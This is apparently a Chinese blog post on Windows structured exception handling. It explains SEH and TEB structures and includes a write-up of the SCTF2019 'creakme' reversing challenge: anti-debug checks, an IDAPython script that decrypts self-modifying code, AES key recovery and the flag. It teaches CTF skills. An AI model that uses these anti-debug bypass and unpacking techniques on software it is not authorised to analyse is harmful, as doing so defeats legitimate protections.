class="comment">//printf(&quot;DIVIDE_BY_ZERO catch\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FilterFuncofOF</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_OVERFLOW)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;OVERFLOW catch\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        __try &#123;</span><br><span class="line">            __try &#123;</span><br><span class="line">            sum += delta;</span><br><span class="line">            a=<span class="number">1</span> / (sum &gt;&gt; <span class="number">31</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            __except (<span class="built_in">FilterFuncofDBZ</span>(<span class="built_in">GetExceptionCode</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">                sum ^= <span class="number">0x1234567</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;__except (<span class="built_in">FilterFuncofOF</span>(<span class="built_in">GetExceptionCode</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            sum = <span class="number">0x9E3779B1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%x\n&quot;, sum);</span></span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里外层甚至还套了个整数溢出异常 只是并没有触发</p><h1 id="进阶知识点"><a href="#进阶知识点" class="headerlink" title="进阶知识点"></a><del>进阶知识点</del></h1><h2 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h2><p>VC++编译器会对SEH做增强版本 这里简单学习以下与SEH有关的TEB(线程环境块)的知识</p><h3 id="NT-TIB"><a href="#NT-TIB" class="headerlink" title="_NT_TIB"></a>_NT_TIB</h3><p>TIB: 线程信息块</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span><span class="title class_">_NT_TIB</span>&#123;</span><br><span class="line"> <span class="keyword">struct</span><span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *ExceptionList;</span><br><span class="line"> PVOID StackBase;</span><br><span class="line"> PVOID StackLimit; </span><br><span class="line"> PVOID SubSystemTib; </span><br><span class="line"> <span class="keyword">union</span> &#123;</span><br><span class="line">PVOID FiberData; </span><br><span class="line">DWORD Version;</span><br><span class="line"> &#125;; </span><br><span class="line"> PVOID ArbitraryUserPointer;</span><br><span class="line">  <span class="keyword">struct</span><span class="title class_">_NT_TIB</span> *Self;</span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure><p>可以看到第一个成员 ExceptionList指针 指向_EXCEPTION_REGISTRATION_RECORD结构体组成的链表 也就是SEH链</p><h3 id="TEB访问方法"><a href="#TEB访问方法" class="headerlink" title="TEB访问方法"></a>TEB访问方法</h3><p>Ntdll.NtCurrentTeb() 返回当前线程TEB结构体的地址</p><h2 id="VC-编译器级的SEH实现"><a href="#VC-编译器级的SEH实现" class="headerlink" title="VC++编译器级的SEH实现"></a>VC++编译器级的SEH实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION</span></span><br><span class="line">&#123;</span><br><span class="line">　　<span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION</span> *prev;      <span class="comment">//ebp-0x14</span></span><br><span class="line">　　<span class="type">void</span>                           *handler;   <span class="comment">//ebp-0x0c</span></span><br><span class="line">　　<span class="keyword">struct</span> <span class="title class_">scopetable_entry</span>        *scopetable;<span class="comment">//ebp-8</span></span><br><span class="line"><span class="comment">//类型为 scopetable_entry 的数组</span></span><br><span class="line">　　<span class="type">int</span>                            trylevel;   <span class="comment">//ebp-4</span></span><br><span class="line"><span class="comment">//数组下标，用来索引 scopetable 中的数组成员</span></span><br><span class="line">　　<span class="type">int</span>                            _ebp;       <span class="comment">//ebp</span></span><br><span class="line"><span class="comment">//包含该 _EXCEPTION_REGISTRATION 结构体的函数的栈帧指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对比原先的结构体:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next;</span><br><span class="line">    <span class="comment">//指向下一个 EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">    PEXCEPTION_DISPOSITION Handler;  </span><br><span class="line">    <span class="comment">//指向异常处理函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD,*PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h3 id="SCOPETABLE"><a href="#SCOPETABLE" class="headerlink" title="_SCOPETABLE"></a>_SCOPETABLE</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SCOPETABLE</span></span><br><span class="line">&#123;</span><br><span class="line">　　 DWORD previousTryLevel; <span class="comment">//定位前一个try块的索引值</span></span><br><span class="line">　　 DWORD lpfnFilter; <span class="comment">//当前try块的过滤函数</span></span><br><span class="line">　　 DWORD lpfnHandler; <span class="comment">//当前try块的终止函数</span></span><br><span class="line">&#125;SCOPETABLE, *PSCOPETABLE;</span><br></pre></td></tr></table></figure><h2 id="扩展异常处理机制"><a href="#扩展异常处理机制" class="headerlink" title="扩展异常处理机制"></a>扩展异常处理机制</h2><p>最初的设计 每个__try __except块对应一个EXCEPTION_REGISTRATION<br>但VS实际实现时 对于嵌套的__try __except块 不管里面还有多少块__try __except块 都只将一个EXCEPTION_REGISTRATION挂入当前线程的异常链表中<br>MSC提供一个处理函数 即 EXCEPTION_REGISTRATION::handler 被设置为 MSC的某个函数而不是我们自己提供的__except块 而我们自己提供的多个__except块被存储在 EXCEPTION_REGISTRATION::scopetable 数组中</p><h1 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h1><h2 id="SCTF2019-creakme"><a href="#SCTF2019-creakme" class="headerlink" title="SCTF2019 creakme"></a>SCTF2019 creakme</h2><p>orz 这题真的难… 不得不感慨IDA强大的FindCrypt插件(逼着我更新了IDAPRO8.3插件版…)<br>IDA打开 main巨长…<br>一看汇编 大大的 _main_SEH!</p><p>sub_4024A0的汇编代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00402320</span> ; __unwind &#123; <span class="comment">// __except_handler4</span></span><br><span class="line">.text:<span class="number">00402320</span>                 push    ebp</span><br><span class="line">.text:<span class="number">00402321</span>                 mov     ebp, esp        ; _ebp</span><br><span class="line">.text:<span class="number">00402323</span>                 push    <span class="number">0F</span>FFFFFFEh      ; trylevel</span><br><span class="line">.text:<span class="number">00402325</span>                 push    offset stru_407B58 ; scopetable</span><br><span class="line">.text:<span class="number">0040232</span>A                 push    offset __except_handler4 ; *handler</span><br><span class="line">.text:<span class="number">0040232F</span>                 mov     eax, large fs:<span class="number">0</span> ; *prev FS:[<span class="number">0</span>]指向SEH起始地址</span><br><span class="line">.text:<span class="number">00402335</span>                 push    eax</span><br></pre></td></tr></table></figure><p>这里入栈的刚好和前面提到的增强版SEH结构体吻合<br>关键的是 scopetable<br>点击查看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00407B</span>58 stru_407B58     dd <span class="number">0F</span>FFFFFE4h           ; GSCookieOffset</span><br><span class="line">.rdata:<span class="number">00407B</span>58                                         ; DATA XREF: sub_402320+<span class="number">5</span>↑o</span><br><span class="line">.rdata:<span class="number">00407B</span>5C                 dd <span class="number">0</span>                    ; GSCookieXOROffset ; FILTER</span><br><span class="line">.rdata:<span class="number">00407B</span>60                 dd <span class="number">0F</span>FFFFFC4h           ; EHCookieOffset</span><br><span class="line">.rdata:<span class="number">00407B</span>64                 dd <span class="number">0</span>                    ; EHCookieXOROffset</span><br><span class="line">.rdata:<span class="number">00407B</span>68                 dd <span class="number">0F</span>FFFFFFEh           ; ScopeRecord.EnclosingLevel</span><br><span class="line">.rdata:<span class="number">00407B</span>6C                 dd offset loc_4023DC    ; ScopeRecord.FilterFunc</span><br><span class="line">.rdata:<span class="number">00407B</span>70                 dd offset loc_4023EF    ; ScopeRecord.HandlerFunc</span><br></pre></td></tr></table></figure><p>IDA已经注释清楚了 对应查看FILTER 和 HANDLER</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004023</span>DC loc_4023DC:                             ; DATA XREF: .rdata:stru_407B58↓o</span><br><span class="line">.text:<span class="number">004023</span>DC                 mov     eax, [ebp+ms_exc.exc_ptr] ; FILTER</span><br><span class="line">.text:<span class="number">004023</span>DF                 mov     eax, [eax]</span><br><span class="line">.text:<span class="number">004023E1</span>                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">004023E3</span>                 cmp     dword ptr [eax], <span class="number">80000003</span>h ; 断点异常</span><br><span class="line">.text:<span class="number">004023E9</span>                 setz    cl</span><br><span class="line">.text:<span class="number">004023</span>EC                 mov     eax, ecx</span><br><span class="line">.text:<span class="number">004023</span>EE                 retn</span><br></pre></td></tr></table></figure><p>这里通过查值发现FILTER的是一个断点异常<br>查看 HANDLER</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004023</span>EF loc_4023EF:                             ; DATA XREF: .rdata:stru_407B58↓o</span><br><span class="line">.text:<span class="number">004023</span>EF                 mov     esp, [ebp+ms_exc.old_esp] ; HANDLER_FUNCTION</span><br><span class="line">.text:<span class="number">004023F</span>2                 lea     eax, [ebp+pbDebuggerPresent]</span><br><span class="line">.text:<span class="number">004023F</span>5                 push    eax             ; pbDebuggerPresent</span><br><span class="line">.text:<span class="number">004023F</span>6                 call    ds:GetCurrentProcess</span><br><span class="line">.text:<span class="number">004023F</span>C                 push    eax             ; hProcess</span><br><span class="line">.text:<span class="number">004023F</span>D                 call    ds:CheckRemoteDebuggerPresent</span><br><span class="line">.text:<span class="number">00402403</span>                 call    ds:IsDebuggerPresent</span><br><span class="line">.text:<span class="number">00402409</span>                 test    eax, eax</span><br><span class="line">.text:<span class="number">0040240B</span>                 jnz     <span class="type">short</span> loc_4023B9</span><br><span class="line">.text:<span class="number">0040240</span>D                 cmp     [ebp+pbDebuggerPresent], eax</span><br><span class="line">.text:<span class="number">00402410</span>                 jnz     <span class="type">short</span> loc_4023B9</span><br><span class="line">.text:<span class="number">00402412</span>                 mov     eax, [ebp+var_24]</span><br><span class="line">.text:<span class="number">00402415</span>                 mov     edx, [eax+<span class="number">10</span>h]</span><br><span class="line">.text:<span class="number">00402418</span>                 mov     ecx, [eax+<span class="number">0</span>Ch]</span><br><span class="line">.text:<span class="number">0040241B</span>                 add     ecx, [ebp+var_28]</span><br><span class="line">.text:<span class="number">0040241</span>E                 mov     esi, [ebp+var_2C]</span><br><span class="line">.text:<span class="number">00402421</span>                 lea     edi, [esi+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">00402424</span></span><br><span class="line">.text:<span class="number">00402424</span> loc_402424:                             ; CODE XREF: sub_402320+<span class="number">109</span>↓j</span><br><span class="line">.text:<span class="number">00402424</span>                 mov     al, [esi]</span><br><span class="line">.text:<span class="number">00402426</span>                 inc     esi</span><br><span class="line">.text:<span class="number">00402427</span>                 test    al, al</span><br><span class="line">.text:<span class="number">00402429</span>                 jnz     <span class="type">short</span> loc_402424</span><br><span class="line">.text:<span class="number">0040242B</span>                 sub     esi, edi</span><br><span class="line">.text:<span class="number">0040242</span>D                 push    esi</span><br><span class="line">.text:<span class="number">0040242</span>E                 push    ecx</span><br><span class="line">.text:<span class="number">0040242F</span>                 call    sub_402450      ; !!!</span><br><span class="line">.text:<span class="number">00402434</span>                 add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00402437</span>                 jmp     <span class="type">short</span> loc_4023B9</span><br></pre></td></tr></table></figure><p>这里经过一系列反调试检测后 调用了sub_402450函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_402450</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= a2 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = aSycloversyclov[v7++];               <span class="comment">// sycloversyclover</span></span><br><span class="line">      *(_BYTE *)(result + a1) = ~(*(_BYTE *)(result + a1) ^ v8);</span><br><span class="line">      ++result;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= a4 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看main 首先调用了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __thiscall <span class="title">sub_402320</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int16 v2; <span class="comment">// bx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">this</span>[<span class="number">15</span>];</span><br><span class="line">  v2 = *(_WORD *)((<span class="type">char</span> *)<span class="keyword">this</span> + v1 + <span class="number">6</span>);</span><br><span class="line">  v3 = (<span class="type">char</span> *)<span class="keyword">this</span> + v1 + <span class="number">248</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strcmp</span>(v3, <span class="string">&quot;.SCTF&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v5 = v5 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">DebugBreak</span>();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 += <span class="number">40</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里DebugBreak()就是触发断点异常！<br>这里v5是strcmp的值 也就是当v3&#x3D;&#x3D;.SCTF时 会触发这个异常<br>猜测这里.SCTF是自带的代码节区段<br>继续分析</p><p>接下来程序调用了sub_404000 跟踪发现是一段被加密的代码段 而且正是 .SCTF<br>所以sub_402450函数是SMC的解密代码<br>我们也直接ida_python 解密后编译成函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">addstr = <span class="number">0x404000</span> </span><br><span class="line">addend = <span class="number">0x405000</span> </span><br><span class="line">key = <span class="string">&quot;sycloversyclover&quot;</span> </span><br><span class="line">j = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(addstr,addend,<span class="number">1</span>): </span><br><span class="line">  data = (~(idc.get_wide_byte(i) ^ <span class="built_in">ord</span>(key[j%<span class="built_in">len</span>(key)]))&amp;<span class="number">0xff</span>) </span><br><span class="line">  ida_bytes.patch_byte(i,data) </span><br><span class="line">  j += <span class="number">1</span> </span><br></pre></td></tr></table></figure><p>得到这个函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">sub_404000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr); ++i )</span><br><span class="line">    --aPvfqyc4ttc2uxr[i];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  <span class="keyword">if</span> ( (result &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = result - v1;</span><br><span class="line">      v4 = *(_BYTE *)(v3 + <span class="number">0x409017</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">4231191</span>) = aPvfqyc4ttc2uxr[v1];</span><br><span class="line">      aPvfqyc4ttc2uxr[v1++] = v4;</span><br><span class="line">      result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt; result &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对字符串作了个变换<br>本来应该是可以C++模拟跑一下出结果 但本地出了点bug 直接把前面的反调试patch掉 让程序运行一遍<br>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</span><br></pre></td></tr></table></figure><p>结合FindCrypt插件的分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddressRules fileNameStringValue</span><br><span class="line">.rdata:004059E0globalRijnDael_AES_4059E0$c0b&#x27;\xa5cc\xc6\x84||\xf8&#x27;</span><br><span class="line">.rdata:00405DE0globalRijnDael_AES_CHAR_405DE0$c0b&#x27;c|w&#123;\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9&#125;\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0&#x27;</span><br><span class="line">.rdata:00405DE0globalRijnDael_AES_LONG_405DE0$c0b&#x27;c|w&#123;\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9&#125;\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0&#x27;</span><br><span class="line">.rdata:00407390globalBASE64_table_407390$c0b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br></pre></td></tr></table></figure><p>这里用了AES和Base64<br>怎么找到哪些是加密函数呢？<br>分析main<br>唯一可能有加密的地方在这</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="built_in">sub_4020D0</span>(Block, (<span class="type">int</span>)v23);</span><br></pre></td></tr></table></figure><p>跟进<br>在里面的sub_401690函数中找到了AES<br>几个关键处</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(_OWORD *)(<span class="keyword">this</span> + <span class="number">980</span>) = xmmword_407360;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span> *)(<span class="keyword">this</span> + <span class="number">1012</span>), &amp;xmmword_407360, *(_DWORD *)(<span class="keyword">this</span> + <span class="number">972</span>));</span><br><span class="line">...</span><br><span class="line">v16 = <span class="string">&quot;sycloversyclover&quot;</span>;</span><br></pre></td></tr></table></figure><p>找到xmmword的值 <code>66746373667463736674637366746373h</code><br>其实就是 <code>ftcsftcsftcsftcs</code><br>注意端序问题 转一下得到 <code>sctfsctfsctfsctf</code><br>找<a href="https://www.toolhelper.cn/SymmetricEncryption/AES" target="_blank">在线网站</a>解一解</p><p><img src="https://s2.loli.net/2023/12/11/4D8V1fKISmkTG6O.png" alt="img"></p><p>最后flag : sctf{Ae3_C8c_I28_pKcs79ad4}</p><hr><hr><p>这题独立做真的够呛的 目前只是在做题的角度投机取巧的解出flag 要完全弄明白还得继续练</p><hr><hr><p>然而又被MoeCTF2023的unwind…<br>说明学习的深度还不够 继续学习</p><h1 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h1><h2 id="编译器增强版本"><a href="#编译器增强版本" class="headerlink" title="编译器增强版本"></a>编译器增强版本</h2><p>以微软的编译器(MSC)为例 提供了 __try __finally __except (VSCODE不支持?)<br>Win32 SDK文档</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// . . .</span></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// guarded code</span></span><br><span class="line">    &#125;</span><br><span class="line">    __except ( <span class="comment">/* filter expression */</span> ) &#123;</span><br><span class="line">        <span class="comment">// termination code</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// . . .</span></span><br></pre></td></tr></table></figure><p>一个函数中 一个__try块中的所有代码就通过创建在这个函数的堆栈帧上的一个EXCEPTION_REGISTRATION结构来保护<br>在函数的入口处，这个新的 EXCEPTION_REGISTRATION 结构被放在异常处理程序链表的头部。在 __try 块结束后，相应的 EXCEPTION_REGISTRATION 结构从这个链表的头部被移除<br>异常处理程序链表的头部被保存在 FS:[0] 处！！！<br>所以看到这种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV DWORD PTR FS:[<span class="number">00000000</span>],ESP</span><br><span class="line">MOV DWORD PTR FS:[<span class="number">00000000</span>],ECX</span><br></pre></td></tr></table></figure><p>就要意识到是在进入或者退出一个__try&#x2F;__except块</p><p>系统实现的EXCEPTION_REGISTRATION结构中的Handler函数相当于filter 